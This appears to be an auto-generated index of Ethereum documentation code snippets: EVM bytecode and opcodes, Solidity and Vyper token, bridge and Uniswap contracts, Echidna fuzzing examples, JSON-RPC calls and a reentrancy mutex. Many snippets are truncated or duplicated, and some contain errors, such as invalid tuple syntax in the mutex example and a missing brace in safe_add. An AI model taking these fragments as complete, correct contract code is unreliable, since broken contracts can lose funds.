SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 P\n```\n\n----------------------------------------\n\nTITLE: Withdrawal Functions in L2StandardBridge Contract\nDESCRIPTION: Public functions that initiate withdrawals from L2 to L1, with options to withdraw to the sender's address or to a specified address. These functions handle the first step of the L2 to L1 bridge process.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Withdrawing *\n     ***************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdraw(\n        address _l2Token,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, msg.sender, _amount, _l1Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdrawTo(\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, _to, _amount, _l1Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing mint Function for ERC-721 Creation\nDESCRIPTION: The mint function creates new tokens and assigns them to a specified address. Only the contract's minter address can call this function, ensuring controlled token creation.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n```\n\n----------------------------------------\n\nTITLE: Defining Mint and Burn Functions in IL2StandardERC20 Interface\nDESCRIPTION: Defines the mint and burn functions that the bridge will call to create or destroy tokens, ensuring token supply on L2 matches locked tokens on L1.\n\nLANGUAGE: solidity\nCODE:\n```\n    function mint(address _to, uint256 _amount) external;\n\n    function burn(address _from, uint256 _amount) external;\n\n    event Mint(address indexed _account, uint256 _amount);\n    event Burn(address indexed _account, uint256 _amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Count Values from Counter Contracts in Solidity\nDESCRIPTION: Functions to get the count value from a specific Counter contract. One function takes an address parameter, while the other uses msg.sender as a convenience method for users.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction getCount(address account) public view returns (uint256) {\n    require (_counters[account] != Counter(0));\n    return (_counters[account].getCount());\n}\n\nfunction getMyCount() public view returns (uint256) {\n    return (getCount(msg.sender));\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Magic Values Smart Contract in Solidity\nDESCRIPTION: This Solidity contract implements a 'magic' function that requires specific input values to change a state variable. It includes a property for Echidna to test against.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool value_found = false;\n  function magic(uint magic_1, uint magic_2, uint magic_3, uint magic_4) public {\n    require(magic_1 == 42);\n    require(magic_2 == 129);\n    require(magic_3 == magic_4+333);\n    value_found = true;\n    return;\n  }\n\n  function echidna_magic_values() public returns (bool) {\n    return !value_found;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Fee-On-Transfer Token Swap Function in Uniswap V2 Router\nDESCRIPTION: External function for swapping exact tokens for tokens with support for fee-on-transfer tokens. It transfers the input tokens to the first pair, performs the swap, and verifies that the output amount meets the minimum requirement.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint amountIn,\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) {\n    TransferHelper.safeTransferFrom(\n        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n    );\n    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n    _swapSupportingFeeOnTransferTokens(path, to);\n    require(\n        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n        'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Smart Contract with Magic Values Challenge\nDESCRIPTION: Solidity contract with a function that requires specific magic values to change a state variable, used to demonstrate corpus collection and modification.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool value_found = false;\n  function magic(uint magic_1, uint magic_2, uint magic_3, uint magic_4) public {\n    require(magic_1 == 42);\n    require(magic_2 == 129);\n    require(magic_3 == magic_4+333);\n    value_found = true;\n    return;\n  }\n\n  function echidna_magic_values() public returns (bool) {\n    return !value_found;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Ethereum Signatures with eth_sign in JavaScript\nDESCRIPTION: Demonstrates using the eth_sign RPC method to create an Ethereum-specific signature by prefixing the message with \"\\x19Ethereum Signed Message:\\n\" and the message length. This prevents signature misuse in malicious applications.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sign\",\"params\":[\"0x9b2055d370f73ec7d8a03e965129118dc8f5bf83\", \"0xdeadbeaf\"],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0xa3f20717a250c2b0b729b7e5becbff67fdaef7e0699da4de7ca5895b02a170a12d887fd3b17bfdce3481f10bea41f45ba9f709d39ce8325427b57afcfc994cee1b\"\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Functions in React Component for Ethereum NFT Minter\nDESCRIPTION: Imports the necessary functions from the interact.js utility file into the Minter.js React component. This includes the mintNFT function along with wallet connection utilities needed for the frontend implementation.\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  connectWallet,\n  getCurrentWalletConnected,\n  mintNFT,\n} from \"./utils/interact.js\"\n```\n\n----------------------------------------\n\nTITLE: Creating a DEX Contract to Trade ERC-20 Tokens for Ether\nDESCRIPTION: Defines a simple decentralized exchange (DEX) contract that deploys an ERC-20 token and provides buy/sell functionality. The contract serves as a simple token market allowing exchange between Ether and tokens.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract DEX {\n\n    IERC20 public token;\n\n    event Bought(uint256 amount);\n    event Sold(uint256 amount);\n\n    constructor() {\n        token = new ERC20Basic();\n    }\n\n    function buy() payable public {\n        // TODO\n    }\n\n    function sell(uint256 amount) public {\n        // TODO\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Functions in React Component for Ethereum NFT Minter\nDESCRIPTION: Imports the necessary functions from the interact.js utility file into the Minter.js React component. This includes the mintNFT function along with wallet connection utilities needed for the frontend implementation.\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  connectWallet,\n  getCurrentWalletConnected,\n  mintNFT,\n} from \"./utils/interact.js\"\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Assertion Testing\nDESCRIPTION: YAML configuration file that enables assertion failure testing in Echidna, necessary for detecting when assert statements fail.\n\nLANGUAGE: yaml\nCODE:\n```\ncheckAsserts: true\n```\n\n----------------------------------------\n\nTITLE: Issuing Transactions with TypeScript in Ethereum\nDESCRIPTION: A function that sends a transaction to change the greeting on an Ethereum smart contract. It uses an async function that returns a Promise and waits for the transaction to be processed, returning the transaction hash.\n\nLANGUAGE: typescript\nCODE:\n```\nconst setGreeting = async (greeting: string): Promise<any> => {\n```\n\nLANGUAGE: typescript\nCODE:\n```\n    const txHash = await greeter.write.setGreeting([greeting]);\n```\n\nLANGUAGE: typescript\nCODE:\n```\n    console.log(`Working on a fix, see https://eth-holesky.blockscout.com/tx/${txHash}`)\n\n    return txHash\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Deposit Limit in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function returns the maximum amount of underlying assets that can be deposited in a single deposit call by the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxDeposit(address receiver) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Importing Functions in React Component for Ethereum NFT Minter\nDESCRIPTION: Imports the necessary functions from the interact.js utility file into the Minter.js React component. This includes the mintNFT function along with wallet connection utilities needed for the frontend implementation.\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  connectWallet,\n  getCurrentWalletConnected,\n  mintNFT,\n} from \"./utils/interact.js\"\n```\n\n----------------------------------------\n\nTITLE: Internal Token Transfer Logic in Vyper\nDESCRIPTION: Core internal function that handles the transfer of a token between addresses, performing all necessary checks and updates. This function is used by both standard and safe transfer methods.\n\nLANGUAGE: python\nCODE:\n```\n@internal\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: ERC-721 Constructor Implementation in Vyper\nDESCRIPTION: The constructor initializes the contract by enabling ERC165 and ERC721 interfaces and setting the contract deployer as the token minter.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Interface Imports in Solidity\nDESCRIPTION: Import statements for various interfaces used by the L2 Standard Bridge, including the L1 bridge interfaces that this contract interacts with.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\n/* Interface Imports */\nimport { IL1StandardBridge } from \"../../L1/messaging/IL1StandardBridge.sol\";\nimport { IL1ERC20Bridge } from \"../../L1/messaging/IL1ERC20Bridge.sol\";\nimport { IL2ERC20Bridge } from \"./IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Contract and Transaction Information Access in EVM (Opcodes 0x30-0x37)\nDESCRIPTION: Opcodes for accessing contract and transaction context information, including current contract address, account balances, transaction origin, message sender, value, and calldata. These provide essential information about the execution environment.\n\nLANGUAGE: evm\nCODE:\n```\n0x30 ADDRESS       // Stack input: .           Output: address(this)       // address of executing contract\n0x31 BALANCE       // Stack input: addr        Output: addr.balance        // balance, in wei\n0x32 ORIGIN        // Stack input: .           Output: tx.origin           // address that originated the tx\n0x33 CALLER        // Stack input: .           Output: msg.sender          // address of msg sender\n0x34 CALLVALUE     // Stack input: .           Output: msg.value           // msg value, in wei\n0x35 CALLDATALOAD  // Stack input: idx         Output: msg.data[idx:idx+32] // read word from msg data at index idx\n0x36 CALLDATASIZE  // Stack input: .           Output: len(msg.data)       // length of msg data, in bytes\n0x37 CALLDATACOPY  // Stack input: dstOst, ost, len  Output: .  // mem[dstOst:dstOst+len-1] := msg.data[ost:ost+len-1]  // copy msg data\n```\n\n----------------------------------------\n\nTITLE: Building a Web Site with Vite for IPFS Deployment\nDESCRIPTION: Command to build a web application using Vite, creating a distribution directory that can be uploaded to IPFS. This generates static files optimized for production deployment.\n\nLANGUAGE: sh\nCODE:\n```\npnpm vite build\n```\n\n----------------------------------------\n\nTITLE: Cache Size Constants Array\nDESCRIPTION: A collection of cache size values in bytes, ranging from approximately 16MB to 68MB. These values likely define the different cache tiers or levels used in the Ethereum memory management system.\n\nLANGUAGE: numeric data\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-721 Interface in Vyper\nDESCRIPTION: Initial code that imports and implements the ERC-721 interface from Vyper's built-in interfaces. This establishes the contract as an ERC-721 compliant NFT contract.\n\nLANGUAGE: python\nCODE:\n```\n# @dev Implementation of ERC-721 non-fungible token standard.\n# @author Ryuya Nakamura (@nrryuya)\n# Modified from: https://github.com/vyperlang/vyper/blob/de74722bf2d8718cca46902be165f9fe0e3641dd/examples/tokens/ERC721.vy\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom vyper.interfaces import ERC721\n\nimplements: ERC721\n```\n\n----------------------------------------\n\nTITLE: Initializing New Pair Contract in Uniswap V2\nDESCRIPTION: Calls the initialize function on the newly created pair contract to configure it with the two tokens it will exchange.\n\nLANGUAGE: solidity\nCODE:\n```\n        IUniswapV2Pair(pair).initialize(token0, token1);\n```\n\n----------------------------------------\n\nTITLE: Completing Liquidity Withdrawal in Uniswap V2\nDESCRIPTION: Finalizes the liquidity withdrawal by burning the liquidity tokens, transferring both token types to the recipient, updating the pool state variables, and emitting the Burn event.\n\nLANGUAGE: solidity\nCODE:\n```\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Standard Events Implementation in Solidity\nDESCRIPTION: This snippet shows the required event declarations for ERC-20 compliant tokens. The Transfer event is emitted when tokens change ownership, and the Approval event is emitted when an address approves another to spend tokens on its behalf.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed _from, address indexed _to, uint256 _value)\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value)\n```\n\n----------------------------------------\n\nTITLE: Creating ERC-20 Transfer Function Selector in Solidity\nDESCRIPTION: Defines the ABI selector for the ERC-20 transfer function. This selector is used when calling the transfer function on token contracts from the pair contract.\n\nLANGUAGE: solidity\nCODE:\n```\nbytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n```\n\n----------------------------------------\n\nTITLE: Defining Bitcoin's State Transition Function\nDESCRIPTION: A simplified representation of Bitcoin's state transition function (APPLY) that processes transactions against the current state and either returns a new state or an error. This function verifies inputs, validates signatures, and ensures conservation of value.\n\nLANGUAGE: pseudo\nCODE:\n```\nAPPLY(S,TX) -> S' or ERROR\n```\n\n----------------------------------------\n\nTITLE: EVM Opcode Example: EXTCODECOPY (0x3C)\nDESCRIPTION: The EXTCODECOPY opcode copies code from another contract address to memory. It takes address, destination offset, offset in code, and length from the stack.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[dstOst:dstOst+len-1] := addr.code[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Implementing Integer Overflow Protection in Solidity Using Require Statements\nDESCRIPTION: This code snippet demonstrates a safe addition function in Solidity that prevents integer overflow. It uses require statements to validate that the result of addition is at least as large as either of the input values, mathematically guaranteeing no overflow can occur.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction safe_add(uint x, uint y) returns(uint z){\n\n  z = x + y;\n  require(z>=x);\n  require(z>=y);\n\n  return z;\n```\n\n----------------------------------------\n\nTITLE: Making a JSON-RPC Request with curl\nDESCRIPTION: Example of a complete curl request to the JSON-RPC API including content type headers. This demonstrates the basic structure for making any request to an Ethereum node.\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Content-Type: application/json\" -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67}' 127.0.0.1:8545\n```\n\n----------------------------------------\n\nTITLE: CALLVALUE Opcode in EVM\nDESCRIPTION: The CALLVALUE opcode returns the value (in wei) sent with the current call. It takes no inputs from the stack and pushes the value in wei sent with the message onto the stack.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nmsg.value\n```\n\n----------------------------------------\n\nTITLE: Setting Token Approval and Emitting Event\nDESCRIPTION: Updates the approval mapping and emits the Approval event to notify listeners of the approval change.\n\nLANGUAGE: python\nCODE:\n```\n    # Set the approval\n    self.idToApprovals[_tokenId] = _approved\n    log Approval(owner, _approved, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Implementing a Private ERC20 Token with Time-Based Restrictions in Solidity\nDESCRIPTION: This code creates an ERC20 token with a private phase where only approved users can receive tokens, and after a specified time period it becomes public. It uses OpenZeppelin contracts and implements the _beforeTokenTransfer hook.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract PrivateERC20 is ERC20, Ownable {\n    mapping (address => bool) public isPrivateUser;\n    uint256 private publicAfterTime;\n\n    constructor(uint256 privateERC20timeInSec) ERC20(\"PrivateERC20\", \"PRIV\") public {\n        publicAfterTime = now + privateERC20timeInSec;\n    }\n\n    function addUser(address user) external onlyOwner {\n        isPrivateUser[user] = true;\n    }\n\n    function isPublic() public view returns (bool) {\n        return now >= publicAfterTime;\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {\n        super._beforeTokenTransfer(from, to, amount);\n\n        require(_validRecipient(to), \"PrivateERC20: invalid recipient\");\n    }\n\n    function _validRecipient(address to) private view returns (bool) {\n        if (isPublic()) {\n            return true;\n        }\n\n        return isPrivateUser[to];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Signing Ethereum Transactions with eth_signTransaction in JavaScript\nDESCRIPTION: Shows how to use the eth_signTransaction RPC method to sign a transaction that can be submitted later with eth_sendRawTransaction. The method returns the RLP-encoded transaction signed by the specified account.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"id\": 1,\"jsonrpc\": \"2.0\",\"method\": \"eth_signTransaction\",\"params\": [{\"data\":\"0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675\",\"from\": \"0xb60e8dd61c5d32be8058bb8eb970870f07233155\",\"gas\": \"0x76c0\",\"gasPrice\": \"0x9184e72a000\",\"to\": \"0xd46e8dd67c5d32be8058bb8eb970870f07244567\",\"value\": \"0x9184e72a\"}]}'\n// Result\n{\n    \"id\": 1,\n    \"jsonrpc\": \"2.0\",\n    \"result\": \"0xa3f20717a250c2b0b729b7e5becbff67fdaef7e0699da4de7ca5895b02a170a12d887fd3b17bfdce3481f10bea41f45ba9f709d39ce8325427b57afcfc994cee1b\"\n}\n```\n\n----------------------------------------\n\nTITLE: Deploying Smart Contract to Goerli Testnet Using Hardhat\nDESCRIPTION: Command to deploy a smart contract to the Goerli testnet using Hardhat. This executes the deployment script while specifying the target network.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Using Translation Hook in React Functions\nDESCRIPTION: Demonstrates the alternative method for translations using the useTranslation hook with the t() function for use in JavaScript code.\n\nLANGUAGE: tsx\nCODE:\n```\nimport { useTranslation } from \"@/hooks/useTranslation\"\n\n// Utilize anywhere in JS using\nconst { t } = useTranslation()\nt(\"language-json-key\")\n```\n\n----------------------------------------\n\nTITLE: Using React useEffect with Wallet Connection in JavaScript\nDESCRIPTION: This useEffect hook initializes the wallet connection on component mount. It retrieves the current wallet connection status and sets up the wallet listener to respond to connection state changes.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Running JavaScript Ethereum Transaction Script\nDESCRIPTION: Simple command to execute the sendTx.js script which sends an Ethereum transaction. This command runs the Node.js program that submits the transaction to the network.\n\nLANGUAGE: bash\nCODE:\n```\nnode sendTx.js\n```\n\n----------------------------------------\n\nTITLE: Validating Approval Authorization for ERC-721\nDESCRIPTION: Checks that the sender is either the token owner or an approved operator before allowing approval changes, ensuring proper authorization control.\n\nLANGUAGE: python\nCODE:\n```\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n```\n\n----------------------------------------\n\nTITLE: Implementing Mutex Lock Pattern for Reentrancy Protection in Solidity\nDESCRIPTION: A smart contract that uses a mutex lock (boolean flag) to prevent reentrancy attacks. The mutex ensures that a function cannot be re-entered until its execution completes by using a custom modifier.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.0;\n\ncontract MutexPattern {\n    bool locked = false;\n    mapping(address => uint256) public balances;\n\n    modifier noReentrancy() {\n        require(!locked, \"Blocked from reentrancy.\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.\n    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier\n    function withdraw(uint _amount) public payable noReentrancy returns(bool) {\n        require(balances[msg.sender] >= _amount, \"No balance to withdraw.\");\n\n        balances[msg.sender] -= _amount;\n        bool (success, ) = msg.sender.call{value: _amount}(\"\");\n        require(success);\n\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Transfer Implementation\nDESCRIPTION: This bytecode segment implements the token transfer functionality, including validation checks for zero addresses, balance checks, and updating storage. It forms the core of the ERC-20 transfer mechanism.\n\nLANGUAGE: bytecode\nCODE:\n```\nPUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 